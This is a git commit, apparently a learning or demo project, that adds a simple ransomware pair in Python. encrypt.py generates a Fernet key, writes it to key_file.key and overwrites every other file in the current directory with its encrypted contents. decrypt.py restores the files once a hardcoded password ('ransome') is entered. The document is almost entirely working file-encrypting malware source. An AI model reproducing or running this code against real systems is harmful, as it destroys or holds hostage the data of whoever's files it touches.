01d270fad69bea3e45f4bcfd96c0cde0121f1417
Rahul Raj Dixit <61109976+rahulrajdixit@users.noreply.github.com>
2022-05-22 11:35:59 +0530

    Add files via upload

---
+++ decrypt.py
@@ -0,0 +1,53 @@
+#!/usr/bin/env python3
+
+# Import libraries
+
+import os
+from cryptography.fernet import Fernet
+print("... libraries imported")
+
+
+# Collect list of files
+
+def get_file_list():
+	files = []
+	for file in os.listdir():
+		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
+			continue
+		if os.path.isfile(file):
+			files.append(file)
+
+	print("Found files are:", files)
+	return files
+
+
+# Get Key
+
+def get_key():
+	with open("key_file.key", "rb") as f:
+		key = f.read()
+	print("...key found")
+	return key
+
+
+# Decrypt
+
+def decryption_process(files, key):
+    password = input("Enter the password to decrypt the file:")
+    if password == "ransome":
+        print("Started decrypting...")
+        for file in files:
+            with open(file, "rb") as f:
+                content = f.read()
+            decrypted_content = Fernet(key).decrypt(content)
+            with open(file, "wb") as f:
+                f.write(decrypted_content)
+                
+        print("...decrypting complete")
+
+
+# Main function calls
+
+files = get_file_list()
+key = get_key()
+decryption_process(files, key)
---
+++ encrypt.py
@@ -0,0 +1,55 @@
+#!/usr/bin/env python3
+
+# Import libraries
+
+import os
+from cryptography.fernet import Fernet
+print("... libraries imported")
+
+
+# Collect list of files
+
+def get_file_list():
+	files = []
+	for file in os.listdir():
+		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
+			continue
+		if os.path.isfile(file):
+			files.append(file)
+
+	print("Found files are:", files)
+	return files
+
+
+# Generate Key
+
+def generate_key_file():
+	key = Fernet.generate_key()
+	print("Key is:", key)
+
+	with open("key_file.key", "wb") as f:
+		f.write(key)
+	print("...Key-file is generated")
+	return key
+
+
+# Encrypt
+
+def encryption_process(files, key):
+	print("Started encrypting...")
+
+	for file in files:
+		with open(file, "rb") as f:
+			content = f.read()
+		encrypted_content = Fernet(key).encrypt(content)
+		with open(file, "wb") as f:
+			f.write(encrypted_content)
+
+	print("...Encrypting complete")
+
+
+# Main function calls
+
+files = get_file_list()
+key = generate_key_file()
+encryption_process(files, key)
